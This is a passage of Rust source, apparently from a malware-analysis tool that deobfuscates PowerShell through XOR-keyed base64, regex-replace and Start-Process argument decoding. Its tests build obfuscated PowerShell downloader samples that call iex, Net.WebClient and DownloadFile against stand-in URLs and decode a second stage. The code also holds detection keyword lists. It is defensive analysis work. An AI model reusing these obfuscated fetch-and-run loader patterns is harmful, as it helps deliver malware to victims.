    out.push('\n');
    out.push_str(&decoded);
    out
}

fn append_decoded_inline_xor_base64_functions(text: &str) -> String {
    let decoded_payloads = decode_inline_xor_base64_functions(text);
    if decoded_payloads.is_empty() {
        return text.to_string();
    }
    let mut out = text.to_string();
    for payload in decoded_payloads {
        let decoded = decode_payload(&payload);
        if decoded.trim().is_empty() {
            continue;
        }
        out.push('\n');
        out.push_str(&decoded);
    }
    out
}

fn expand_keyed_base64_xor_string_fragments(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "function")
        || !contains_ascii_case_insensitive(text, "frombase64st")
        || !contains_ascii_case_insensitive(text, "-bxor")
    {
        return text.to_string();
    }

    let key_arrays = inline_xor_key_arrays(text);
    if key_arrays.is_empty() {
        return text.to_string();
    }

    let mut function_defs: Vec<(String, Vec<u8>)> = Vec::new();
    let defs: Vec<_> = PS_FUNCTION_DEF_RE.captures_iter(text).collect();
    for (idx, caps) in defs.iter().enumerate() {
        let Some(name_match) = caps.get(1) else {
            continue;
        };
        let Some(full_match) = caps.get(0) else {
            continue;
        };
        let end = defs
            .get(idx + 1)
            .and_then(|next| next.get(0).map(|m| m.start()))
            .unwrap_or(text.len())
            .min(full_match.start().saturating_add(16 * 1024));
        let body = &text[full_match.start()..end];
        if !contains_ascii_case_insensitive(body, "frombase64st") {
            continue;
        }
        let lower_body = body.to_ascii_lowercase();
        let Some(key) = key_arrays.iter().find_map(|(key_name, key)| {
            lower_body
                .contains(&format!("${}", key_name))
                .then_some(key.clone())
        }) else {
            continue;
        };
        function_defs.push((name_match.as_str().to_string(), key));
    }
    if function_defs.is_empty() {
        return text.to_string();
    }

    let mut out = text.to_string();
    for (name, key) in function_defs {
        let call_re_str = format!(
            r#"(?i)(?:^|[^\w]){}\s*\(?\s*['"]([A-Za-z0-9+/=]{{8,8192}})['"]\s*\)?"#,
            regex::escape(&name)
        );
        let Ok(call_re) = Regex::new(&call_re_str) else {
            continue;
        };
        let matches: Vec<(usize, usize, String)> = call_re
            .captures_iter(&out)
            .filter_map(|caps| {
                let full = caps.get(0)?;
                let blob = caps.get(1)?.as_str();
                let decoded = decode_keyed_base64_xor_fragment(blob, &key)?;
                if !looks_like_decoded_xor_fragment(&decoded) {
                    return None;
                }
                let decoded_text = String::from_utf8_lossy(&decoded).to_string();
                if !decoded_xor_fragment_is_interesting(&decoded_text) {
                    return None;
                }
                let raw_match = full.as_str();
                let name_start = raw_match
                    .find(|c: char| c.is_alphanumeric() || c == '_')
                    .unwrap_or(0);
                let prefix = &raw_match[..name_start];
                Some((
                    full.start(),
                    full.end(),
                    format!("{}'{}'", prefix, decoded_text.replace('\'', "")),
                ))
            })
            .collect();
        for (start, end, replacement) in matches.into_iter().rev() {
            out.replace_range(start..end, &replacement);
        }
    }
    out
}

fn inline_xor_key_arrays(text: &str) -> std::collections::HashMap<String, Vec<u8>> {
    let mut key_arrays = std::collections::HashMap::new();
    for caps in INLINE_XOR_KEY_ARRAY_RE.captures_iter(text) {
        let Some(name) = caps.get(1).map(|m| m.as_str().to_ascii_lowercase()) else {
            continue;
        };
        let Some(raw_values) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let key: Vec<u8> = raw_values
            .split(',')
            .filter_map(|part| part.trim().parse::<u8>().ok())
            .collect();
        if (1..=32).contains(&key.len()) {
            key_arrays.insert(name, key);
        }
    }
    key_arrays
}

fn decode_keyed_base64_xor_fragment(blob: &str, key: &[u8]) -> Option<Vec<u8>> {
    if key.is_empty() {
        return None;
    }
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(blob)
        .ok()?;
    if decoded.is_empty() || decoded.len() > 64 * 1024 {
        return None;
    }
    Some(
        decoded
            .into_iter()
            .enumerate()
            .map(|(idx, byte)| byte ^ key[idx % key.len()])
            .collect(),
    )
}

fn looks_like_decoded_xor_fragment(bytes: &[u8]) -> bool {
    if bytes.is_empty() || bytes.len() > 64 * 1024 || bytes.contains(&0) {
        return false;
    }
    let printable = bytes
        .iter()
        .filter(|byte| byte.is_ascii_graphic() || byte.is_ascii_whitespace())
        .count();
    if printable * 100 / bytes.len() < 85 {
        return false;
    }
    let text = String::from_utf8_lossy(bytes);
    text.chars().any(|ch| ch.is_ascii_alphabetic())
}

fn decoded_xor_fragment_is_interesting(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "http://")
        || contains_ascii_case_insensitive(text, "https://")
        || contains_ascii_case_insensitive(text, "ftp://")
        || contains_ascii_case_insensitive(text, "file://")
        || contains_ascii_case_insensitive(text, "downloadfile")
        || contains_ascii_case_insensitive(text, "downloadstring")
        || contains_ascii_case_insensitive(text, "net.webclient")
        || contains_ascii_case_insensitive(text, "frombase64string")
        || contains_ascii_case_insensitive(text, "invoke-webrequest")
        || contains_ascii_case_insensitive(text, "invoke-restmethod")
        || contains_ascii_case_insensitive(text, ".invoke(")
        || contains_ascii_case_insensitive(text, "new-object")
}

fn decode_inline_xor_base64_functions(text: &str) -> Vec<Vec<u8>> {
    if !contains_ascii_case_insensitive(text, "-bxor") {
        return Vec::new();
    }

    let key_arrays = inline_xor_key_arrays(text);
    if key_arrays.is_empty() {
        return Vec::new();
    }

    let mut function_keys = std::collections::HashMap::new();
    for caps in INLINE_XOR_FUNCTION_RE.captures_iter(text) {
        let Some(function_name) = caps.get(1).map(|m| m.as_str().to_ascii_lowercase()) else {
            continue;
        };
        let Some(key_name) = caps.get(2).map(|m| m.as_str().to_ascii_lowercase()) else {
            continue;
        };
        if key_arrays.contains_key(&key_name) {
            function_keys.insert(function_name, key_name);
        }
    }
    if function_keys.is_empty() {
        return Vec::new();
    }

    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in INLINE_XOR_CALL_RE.captures_iter(text) {
        let Some(function_name) = caps.get(1).map(|m| m.as_str().to_ascii_lowercase()) else {
            continue;
        };
        let Some(key_name) = function_keys.get(&function_name) else {
            continue;
        };
        let Some(key) = key_arrays.get(key_name) else {
            continue;
        };
        let Some(blob) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        if !seen.insert(blob) {
            continue;
        }
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(blob) else {
            continue;
        };
        let xored: Vec<u8> = decoded
            .into_iter()
            .enumerate()
            .map(|(idx, byte)| byte ^ key[idx % key.len()])
            .collect();
        if looks_like_powershell_payload(&xored) {
            out.push(xored);
        }
    }
    out
}

#[cfg(test)]
mod inline_xor_function_tests {
    use super::{
        expand_dense_skip_nth_payload, expand_for_substring_stride_fast_path_payload,
        normalize_ps1_payload_for_report_until,
    };
    use base64::Engine;

    fn encode_xor_b64(text: &str, key: &[u8]) -> String {
        let xored: Vec<u8> = text
            .bytes()
            .enumerate()
            .map(|(idx, byte)| byte ^ key[idx % key.len()])
            .collect();
        base64::engine::general_purpose::STANDARD.encode(xored)
    }

    #[test]
    fn nested_keyed_xor_base64_function_calls_are_appended() {
        let key = [65u8, 113, 117, 105, 102, 117, 103];
        let url = encode_xor_b64("https://drive.example/payload", &key);
        let method = encode_xor_b64("DownloadFile", &key);
        let script = format!(
            "$dendppeara=@(65,113,117,105,102,117,103);\
function adynamias ($dend,$klaeknings) {{$recogn='[int]$dend ';$recogn+='-bxor [int]$klaeknings';Skuri ($recogn)}}\
function Skuri ($translumplemen) {{.($accu) ($translumplemen)}}\
Function Publi ($klaekningslankslidt,$sabatonsr31=0){{$raasyltnin='$script:';$raasyltnin+='tostesa=[';$raasyltnin+='Convert]';$raasyltnin+='::FromBase64String($klaekningslankslidt)';Skuri ($raasyltnin);For($translu=0; $translu -lt $tostesa.Length; $translu++){{$tostesa[$translu] = adynamias $tostesa[$translu] $dendppeara[$translu%%7]}}Skuri ('$global:gutters=[Text.Encoding]::ASCII.GetString($tostesa)');if ($sabatonsr31) {{ Skuri $gutters }} else {{ $gutters }}}}\
$accu='iex';$stjern=Publi '{url}';$spyd=Publi '{method}';"
        );

        let (normalized, timed_out) =
            normalize_ps1_payload_for_report_until(script.as_bytes(), None);

        assert!(!timed_out);
        assert!(
            normalized.contains("https://drive.example/payload"),
            "normalized payload did not include decoded URL:\n{normalized}"
        );
        assert!(
            normalized.contains("DownloadFile"),
            "normalized payload did not include decoded method:\n{normalized}"
        );
    }

    #[test]
    fn substring_stride_fast_path_expands_keyed_xor_base64_calls() {
        let key = [65u8, 113, 117, 105, 102, 117, 103];
        let ua = encode_xor_b64(
            "5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
            &key,
        );
        let url = encode_xor_b64(
            "https://drive.google.com/uc?export=download&id=13xQgCXCMFT32vI379p5cKZXz2jD-uTO4",
            &key,
        );
        let web_client = encode_xor_b64("$global:siouxerf=New-Object Net.WebClient", &key);
        let method = encode_xor_b64("DownloadFile", &key);
        let invoke = encode_xor_b64("$siouxerf.$spyd.Invoke($stjern,$sten)", &key);
        let second_stage = encode_xor_b64(
            "$global:Trkulud=[Convert]::FromBase64String($dulcified)",
            &key,
        );
        let script = format!(
            "$dendppeara=@(65,113,117,105,102,117,103);\
function adynamias ($dend,$klaeknings) {{$recogn='[int]$dend ';$recogn+='-bxor [int]$klaeknings';Skuri ($recogn)}}\
function Skuri ($translumplemen) {{.($accu) ($translumplemen)}}\
function guamachil ($klaekningslankslidt) {{ sv 'kursensn';$translu=3;do {{$cere+=$klaekningslankslidt[$translu];$translu+=4}} until (!$klaekningslankslidt[$translu])$cere}}\
Function Publi ($klaekningslankslidt,$sabatonsr31=0){{$raasyltnin='$script:';$raasyltnin+='tostesa=[';$raasyltnin+='Convert]';$raasyltnin+='::FromBase64String($klaekningslankslidt)';Skuri ($raasyltnin);;For($translu=0; $translu -lt $tostesa.Length; $translu++){{$tostesa[$translu] = adynamias $tostesa[$translu] $dendppeara[$translu%%7]}}Skuri ('$global:gutters=[Text.Encoding]::ASCII.GetString($t% _  *&';if ($sabatonsr31) {{ Skuri $gutters}}else {{;$gutters}}}}\
$accu='iex';$divisibl=Publi '{ua}';$stjern=Publi '{url}';Publi '{web_client}' 1;$spyd=Publi '{method}';$oprrsa=Publi '{invoke}';Publi '{second_stage}' 1;"
        );

        let normalized = expand_for_substring_stride_fast_path_payload(&script);

        assert!(
            normalized.contains("https://drive.google.com/uc?export=download&id="),
            "fast-path output did not include decoded URL:\n{normalized}"
        );
        assert!(
            normalized.contains("$global:siouxerf=New-Object Net.WebClient"),
            "fast-path output did not include decoded WebClient setup:\n{normalized}"
        );
        assert!(
            normalized.contains("DownloadFile"),
            "fast-path output did not include decoded method:\n{normalized}"
        );
        assert!(
            normalized.contains("$siouxerf.$spyd.Invoke($stjern,$sten)"),
            "fast-path output did not include decoded dynamic invocation:\n{normalized}"
        );
        assert!(
            normalized.contains("[Convert]::FromBase64String($dulcified)"),
            "fast-path output did not include decoded second-stage decode:\n{normalized}"
        );
    }

    #[test]
    fn dense_skip_nth_fast_path_expands_keyed_xor_base64_calls() {
        let key = [65u8, 113, 117, 105, 102, 117, 103];
        let url = encode_xor_b64("https://drive.google.com/uc?export=download&id=abc", &key);
        let method = encode_xor_b64("DownloadFile", &key);
        let script = format!(
            "$dendppeara=@(65,113,117,105,102,117,103);\
function adynamias ($dend,$klaeknings) {{$recogn='[int]$dend ';$recogn+='-bxor [int]$klaeknings';Skuri ($recogn)}}\
Function Publi ($klaekningslankslidt) {{$raasyltnin='$script:';$raasyltnin+='tostesa=[';$raasyltnin+='Convert]';$raasyltnin+='::FromBase64String($klaekningslankslidt)';For($translu=0; $translu -lt $tostesa.Length; $translu++){{$tostesa[$translu] = adynamias $tostesa[$translu] $dendppeara[$translu%%7]}}}}\
$stjern=Publi '{url}';$spyd=Publi '{method}';"
        );

        let normalized = expand_dense_skip_nth_payload(&script);

        assert!(
            normalized.contains("https://drive.google.com/uc?export=download&id=abc"),
            "dense fast-path output did not include decoded URL:\n{normalized}"
        );
        assert!(
            normalized.contains("DownloadFile"),
            "dense fast-path output did not include decoded method:\n{normalized}"
        );
    }
}

#[cfg(test)]
mod rc4_wrapper_prefilter_tests {
    use super::append_decoded_rc4_wrappers;

    #[test]
    fn ignores_text_without_rc4_shape() {
        let text = "Write-Host hello world";
        assert_eq!(append_decoded_rc4_wrappers(text), text);
    }
}

#[cfg(test)]
mod powershell_payload_tests {
    use super::looks_like_powershell_payload;

    #[test]
    fn rejects_plain_text_payload() {
        assert!(!looks_like_powershell_payload(b"Write-Host hello world"));
    }
}

fn decode_utf16_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 2 != 0 {
        return None;
    }
    let u16s: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|pair| {
            if big_endian {
                u16::from_be_bytes([pair[0], pair[1]])
            } else {
                u16::from_le_bytes([pair[0], pair[1]])
            }
        })
        .collect();
    Some(String::from_utf16_lossy(&u16s))
}

fn decode_utf32_lossy(bytes: &[u8], big_endian: bool) -> Option<String> {
    if bytes.len() % 4 != 0 {
        return None;
    }
    let decoded: String = bytes
        .chunks_exact(4)
        .map(|chunk| {
            let value = if big_endian {
                u32::from_be_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            } else {
                u32::from_le_bytes([chunk[0], chunk[1], chunk[2], chunk[3]])
            };
            char::from_u32(value).unwrap_or(char::REPLACEMENT_CHARACTER)
        })
        .collect();
    Some(decoded)
}

fn expand_base64_literals(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string") && !text.contains('=') {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = B64_LITERAL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let b64 = caps.get(1)?.as_str();
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            if !should_inline_base64_decoded_payload(&decoded) {
                return None;
            }
            let s = decode_payload(&decoded).into_owned();
            Some((full.start(), full.end(), format!("'{}'", s)))
        })
        .collect();
    let mut result = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        result.replace_range(start..end, &replacement);
    }
    result
}

#[cfg(test)]
mod base64_literal_prefilter_tests {
    use super::expand_base64_literals;

    #[test]
    fn ignores_text_without_base64_literal_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_base64_literals(text), text);
    }
}

fn should_inline_base64_decoded_payload(decoded: &[u8]) -> bool {
    if decoded.is_empty() {
        return false;
    }
    let text = decode_payload(decoded);
    if contains_ascii_case_insensitive(&text, "http://")
        || contains_ascii_case_insensitive(&text, "https://")
        || contains_ascii_case_insensitive(&text, "download")
        || contains_ascii_case_insensitive(&text, "frombase64string")
        || contains_ascii_case_insensitive(&text, "invoke-")
        || contains_ascii_case_insensitive(&text, "powershell")
        || contains_ascii_case_insensitive(&text, "new-object")
        || contains_ascii_case_insensitive(&text, "start-process")
        || contains_ascii_case_insensitive(&text, "cmd.exe")
    {
        return true;
    }

    if decoded.len() > 64 * 1024 {
        return false;
    }
    let printable = decoded
        .iter()
        .filter(|b| b.is_ascii_graphic() || matches!(**b, b' ' | b'\r' | b'\n' | b'\t'))
        .count();
    let hard_controls = decoded
        .iter()
        .filter(|b| b.is_ascii_control() && !matches!(**b, b'\r' | b'\n' | b'\t'))
        .count();
    printable * 100 >= decoded.len() * 90 && hard_controls * 100 <= decoded.len()
}

#[allow(clippy::expect_used)]
static PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*'''([^'\r\n]{1,8192})'''"#)
        .expect("ps embedded single quote assignment")
});

fn expand_ps_embedded_single_quote_assignments(text: &str) -> String {
    if !text.contains("'''") {
        return text.to_string();
    }
    PS_EMBEDDED_SINGLE_QUOTE_ASSIGN_RE
        .replace_all(text, "$$$1=\"'$2'\"")
        .into_owned()
}

#[cfg(test)]
mod embedded_single_quote_signal_tests {
    use super::expand_ps_embedded_single_quote_assignments;

    #[test]
    fn embedded_single_quote_signal_blocks_generic_triple_quotes() {
        let text = "$name = 'demo'; Write-Host '''quoted'''";

        let out = expand_ps_embedded_single_quote_assignments(text);

        assert_eq!(out, text);
    }

    #[test]
    fn embedded_single_quote_signal_allows_assignments() {
        let text = "$payload = '''Invoke-WebRequest https://x.test/a'''";

        let out = expand_ps_embedded_single_quote_assignments(text);

        assert_eq!(out, "$payload=\"'Invoke-WebRequest https://x.test/a'\"");
    }
}

#[allow(clippy::expect_used)]
static REGEX_REPLACE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\[regex\]::Replace\s*\(\s*'([^']*)'\s*,\s*''?([^']*)''?\s*,\s*''?([^']*)''?\s*\)"#,
    )
    .expect("regex replace call")
});

#[allow(clippy::expect_used)]
static B64_REGEX_REPLACE_VAR_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?is)\[(?:System\.)?Convert\]::FromBase64String\s*\(\s*\[regex\]::Replace\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*,\s*'+([^']*)'+\s*,\s*'+([^']*)'+\s*\)\s*\)"#,
    )
    .expect("b64 regex replace variable call")
});

fn expand_regex_replace_calls(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "[regex]::replace(") {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = REGEX_REPLACE_CALL_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let haystack = caps.get(1)?.as_str();
            let needle = caps.get(2)?.as_str();
            let repl = caps.get(3)?.as_str();
            Some((
                full.start(),
                full.end(),
                format!("'{}'", haystack.replace(needle, repl)),
            ))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod regex_replace_call_prefilter_tests {
    use super::expand_regex_replace_calls;

    #[test]
    fn ignores_text_without_regex_replace_shape() {
        let text = "Write-Host hello world";
        assert_eq!(expand_regex_replace_calls(text), text);
    }
}

fn expand_regex_replace_base64_variables(text: &str) -> String {
    if !contains_ascii_case_insensitive(text, "frombase64string")
        || !contains_ascii_case_insensitive(text, "[regex]::replace(")
    {
        return text.to_string();
    }
    let bindings = ps_string_bindings(text);
    if bindings.is_empty() {
        return text.to_string();
    }
    let matches: Vec<(usize, usize, String)> = B64_REGEX_REPLACE_VAR_RE
        .captures_iter(text)
        .filter_map(|caps| {
            let full = caps.get(0)?;
            let var = caps.get(1)?.as_str().to_ascii_lowercase();
            let needle = caps.get(2)?.as_str();
            let replacement = caps.get(3)?.as_str();
            let value = bindings.get(&var)?;
            let b64 = value.replace(needle, replacement);
            let decoded = base64::engine::general_purpose::STANDARD.decode(b64).ok()?;
            let decoded = decode_payload(&decoded).into_owned().replace('\'', "''");
            Some((full.start(), full.end(), format!("'{decoded}'")))
        })
        .collect();
    let mut out = text.to_string();
    for (start, end, replacement) in matches.into_iter().rev() {
        out.replace_range(start..end, &replacement);
    }
    out
}

#[cfg(test)]
mod regex_replace_b64_prefilter_tests {
    use super::expand_regex_replace_base64_variables;

    #[test]
    fn ignores_text_without_regex_replace_base64_shape() {
        let text = "Write-Host 'hello world'";
        assert_eq!(expand_regex_replace_base64_variables(text), text);
    }
}

fn ps_string_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut bindings = std::collections::HashMap::new();
    let mut events: Vec<(usize, bool, String, String)> = Vec::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let Some(full) = caps.get(0) else { continue };
            events.push((
                full.start(),
                false,
                name.as_str().to_ascii_lowercase(),
                value,
            ));
        }
    }
    for caps in PS_VAR_APPEND_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            let Some(full) = caps.get(0) else { continue };
            events.push((
                full.start(),
                true,
                name.as_str().to_ascii_lowercase(),
                value,
            ));
        }
    }
    events.sort_by_key(|(pos, _, _, _)| *pos);
    for (_, append, name, value) in events {
        if append {
            bindings
                .entry(name)
                .or_insert_with(String::new)
                .push_str(&value);
        } else {
            bindings.insert(name, value);
        }
    }
    for _ in 0..3 {
        let mut changed = false;
        for caps in PS_MIXED_CONCAT_ASSIGN_RE.captures_iter(text) {
            let (Some(name), Some(rhs)) = (caps.get(1), caps.get(2)) else {
                continue;
            };
            let Some(value) = resolve_ps_mixed_concat_expr(rhs.as_str(), &bindings) else {
                continue;
            };
            let key = name.as_str().to_ascii_lowercase();
            if bindings.get(&key) != Some(&value) {
                bindings.insert(key, value);
                changed = true;
            }
        }
        if !changed {
            break;
        }
    }
    bindings
}

fn resolve_ps_mixed_concat_expr(
    rhs: &str,
    bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    let mut out = String::new();
    let mut saw_part = false;
    for caps in PS_MIXED_CONCAT_PART_RE.captures_iter(rhs) {
        if let Some(name) = caps.get(1) {
            out.push_str(bindings.get(&name.as_str().to_ascii_lowercase())?);
        } else if let Some(value) = caps.get(2) {
            out.push_str(&value.as_str().replace("''", "'"));
        } else if let Some(value) = caps.get(3) {
            out.push_str(value.as_str());
        }
        saw_part = true;
    }
    saw_part.then_some(out)
}

fn expand_start_process_argument_list(text: &str) -> String {
    let mut out = text.to_string();
    let mut cursor = 0usize;
    let lower = text.to_ascii_lowercase();
    let array_bindings = ps_quoted_array_space_bindings(text);
    while let Some(rel) = lower[cursor..].find("-a") {
        let flag_start = cursor + rel;
        let Some(flag_len) = start_process_argument_list_flag_len_at(&lower, flag_start) else {
            cursor = flag_start + 2;
            continue;
        };
        let pos = flag_start + flag_len;
        let Some((inner, end)) = parse_ps_argument_list_value(text, pos, &array_bindings) else {
            cursor = pos;
            continue;
        };
        let normalized = inner
            .replace("\\\"", "\"")
            .replace("`\"", "\"")
            .replace("\\'", "'");
        let normalized_lower = normalized.to_ascii_lowercase();
        let should_append_normalized = normalized_lower.contains("frombase64string")
            || normalized_lower.contains("download")
            || normalized.contains("http://")
            || normalized.contains("https://");
        if let Some(decoded) = decode_start_process_encoded_argument(&normalized) {
            if !out.contains(&decoded) {
                out.push('\n');
                out.push_str(&decoded);
            }
        } else if should_append_normalized && !out.contains(&normalized) {
            out.push('\n');
            out.push_str(&normalized);
        }
        cursor = end;
    }
    append_start_process_positional_argument_list(text, &mut out);
    out
}

fn append_start_process_positional_argument_list(text: &str, out: &mut String) {
    let lower = text.to_ascii_lowercase();
    let mut cursor = 0usize;
    while let Some(rel) = lower[cursor..].find("start-process") {
        let start = cursor + rel;
        let end = start + "start-process".len();
        if !is_ps_word_boundary_before(&lower, start) || !is_ps_word_boundary_at(&lower, end) {
            cursor = end;
            continue;
        }
        let Some((argument, argument_end)) =
            parse_start_process_positional_powershell_argument(text, end)
        else {
            cursor = end;
            continue;
        };
        let normalized = argument
            .replace("\\\"", "\"")
            .replace("`\"", "\"")
            .replace("\\'", "'");
        if let Some(decoded) = decode_start_process_encoded_argument(&normalized) {
            if !out.contains(&decoded) {
                out.push('\n');
                out.push_str(&decoded);
            }
        }
        cursor = argument_end;
    }
}

fn parse_start_process_positional_powershell_argument(
    text: &str,
    start: usize,
) -> Option<(String, usize)> {
    let (first, first_end) = parse_ps_argument_atom(text, start)?;
    if start_process_option_takes_value(&first) {
        let (_, option_end) = parse_ps_argument_atom(text, first_end)?;
        return parse_start_process_positional_powershell_argument(text, option_end);
    }
    if start_process_switch_option(&first) {
        return parse_start_process_positional_powershell_argument(text, first_end);
    }
    if ps_process_target_is_powershell(&first) {
        return parse_ps_argument_list_value(text, first_end, &std::collections::HashMap::new());
    }

    if let Some(target) = start_process_filepath_attached_value(&first) {
        if ps_process_target_is_powershell(target) {
            return parse_ps_argument_list_value(
                text,
                first_end,
                &std::collections::HashMap::new(),
            );
        }
        return None;
    }

    if !start_process_filepath_flag(&first) {
        return None;
    }
    let (target, target_end) = parse_ps_argument_atom(text, first_end)?;
    if !ps_process_target_is_powershell(&target) {
        return None;
    }
    parse_ps_argument_list_value(text, target_end, &std::collections::HashMap::new())
}

fn start_process_filepath_flag(token: &str) -> bool {
    let lower = token.trim_matches(['"', '\'']).to_ascii_lowercase();
    matches!(lower.as_str(), "-filepath" | "-file" | "-f")
}

fn start_process_filepath_attached_value(token: &str) -> Option<&str> {
    let token = token.trim_matches(['"', '\'']);
    let (flag, value) = token.split_once([':', '='])?;
    start_process_filepath_flag(flag).then_some(value)
}

fn start_process_option_takes_value(token: &str) -> bool {
    let lower = token.trim_matches(['"', '\'']).to_ascii_lowercase();
    matches!(
        lower.as_str(),
        "-windowstyle" | "-win" | "-verb" | "-workingdirectory" | "-workingdir" | "-credential"
    )
}

fn start_process_switch_option(token: &str) -> bool {
    let lower = token.trim_matches(['"', '\'']).to_ascii_lowercase();
    matches!(
        lower.as_str(),
        "-nonewwindow" | "-wait" | "-passthru" | "-usenewenvironment" | "-loaduserprofile"
    )
}

fn ps_process_target_is_powershell(target: &str) -> bool {
    let trimmed = target.trim_matches(['"', '\'']);
    let basename = trimmed.rsplit(['\\', '/']).next().unwrap_or(trimmed);
    let lower = basename.to_ascii_lowercase();
    matches!(
        lower.strip_suffix(".exe").unwrap_or(&lower),
        "powershell" | "pwsh"
    )
}

fn is_ps_word_boundary_before(text: &str, idx: usize) -> bool {
    if idx == 0 {
        return true;
    }
    is_ps_word_boundary_at(text, idx - 1)
}

fn is_ps_word_boundary_at(text: &str, idx: usize) -> bool {
    match text.as_bytes().get(idx) {
        Some(b) => !(b.is_ascii_alphanumeric() || *b == b'-' || *b == b'_'),
        None => true,
    }
}

fn ps_quoted_array_space_bindings(text: &str) -> std::collections::HashMap<String, String> {
    let mut scalar_bindings = std::collections::HashMap::new();
    for caps in PS_VAR_ASSIGN_RE.captures_iter(text) {
        if let (Some(name), Some(value)) = (caps.get(1), ps_literal_assignment_value(&caps)) {
            scalar_bindings.insert(name.as_str().to_ascii_lowercase(), value);
        }
    }

    let mut bindings = std::collections::HashMap::new();
    for caps in PS_ARGUMENT_ARRAY_ASSIGN_RE.captures_iter(text) {
        let (Some(name), Some(parts_text)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(parts) = ps_argument_array_parts(parts_text.as_str(), &scalar_bindings) else {
            continue;
        };
        if parts.len() > 1 {
            bindings.insert(name.as_str().to_ascii_lowercase(), parts.join(" "));
        }
    }
    bindings
}

fn ps_argument_array_parts(
    parts_text: &str,
    scalar_bindings: &std::collections::HashMap<String, String>,
) -> Option<Vec<String>> {
    let mut parts = Vec::new();
    for raw_part in parts_text.split(',') {
        let part = raw_part.trim();
        if part.is_empty() {
            return None;
        }
        if let Some(value) = ps_literal_arg(part) {
            parts.push(value);
            continue;
        }
        let (name, end) = parse_ps_variable_reference(part, 0)?;
        if end != part.len() {
            return None;
        }
        parts.push(scalar_bindings.get(&name.to_ascii_lowercase())?.clone());
    }
    Some(parts)
}

fn ps_literal_arg(arg: &str) -> Option<String> {
    PS_QUOTED_LITERAL_RE.captures(arg).and_then(|literal_caps| {
        literal_caps
            .get(1)
            .or_else(|| literal_caps.get(2))
            .map(|m| m.as_str().replace("''", "'"))
    })
}

fn parse_ps_argument_list_value(
    text: &str,
    start: usize,
    array_bindings: &std::collections::HashMap<String, String>,
) -> Option<(String, usize)> {
    let start = skip_ps_argument_array_prefix(text, start);
    if let Some((name, end)) = parse_ps_variable_reference(text, start) {
        if let Some(value) = array_bindings.get(&name.to_ascii_lowercase()) {
            return Some((value.clone(), end));
        }
    }
    let (first, mut end) = parse_ps_argument_atom(text, start)?;
    let mut parts = vec![first];

    loop {
        let mut pos = end;
        while pos < text.len() {
            let ch = text[pos..].chars().next()?;
            if !ch.is_whitespace() {
                break;
            }
            pos += ch.len_utf8();
        }
        if text.as_bytes().get(pos) != Some(&b',') {
            break;
        }
        pos += 1;
        let Some((next, next_end)) = parse_ps_argument_atom(text, pos) else {
            break;
        };
        parts.push(next);
        end = next_end;
    }

    Some((parts.join(" "), end))
}

fn parse_ps_argument_atom(text: &str, start: usize) -> Option<(String, usize)> {
    if let Some(quoted) = parse_ps_quoted_argument(text, start) {
        return Some(quoted);
    }

    let mut pos = start;
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        if !ch.is_whitespace() {
            break;
        }
        pos += ch.len_utf8();
    }
    if matches!(text.as_bytes().get(pos), Some(b':' | b'=')) {
        pos += 1;
        while pos < text.len() {
            let ch = text[pos..].chars().next()?;
            if !ch.is_whitespace() {
                break;
            }
            pos += ch.len_utf8();
        }
    }

    let atom_start = pos;
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        if ch.is_whitespace() || matches!(ch, ',' | ';' | ')' | ']' | '}') {
            break;
        }
        pos += ch.len_utf8();
    }
    (pos > atom_start).then(|| (text[atom_start..pos].to_string(), pos))
}

fn parse_ps_variable_reference(text: &str, start: usize) -> Option<(&str, usize)> {
    let mut pos = start;
    while pos < text.len() {
        let ch = text[pos..].chars().next()?;
        if !ch.is_whitespace() {
            break;
        }
        pos += ch.len_utf8();
    }
    if matches!(text.as_bytes().get(pos), Some(b':' | b'=')) {
        pos += 1;
        while pos < text.len() {
            let ch = text[pos..].chars().next()?;
            if !ch.is_whitespace() {
                break;
            }
            pos += ch.len_utf8();
        }
    }
    if text.as_bytes().get(pos) != Some(&b'$') {
        return None;
    }
    let name_start = pos + 1;
    let mut name_end = name_start;
    while let Some(&b) = text.as_bytes().get(name_end) {
        if !(b.is_ascii_alphanumeric() || b == b'_') {
            break;
        }
        name_end += 1;
    }
    (name_end > name_start).then_some((&text[name_start..name_end], name_end))
}

fn skip_ps_argument_array_prefix(text: &str, start: usize) -> usize {
    let mut pos = start;
    while pos < text.len() {
        let Some(ch) = text[pos..].chars().next() else {
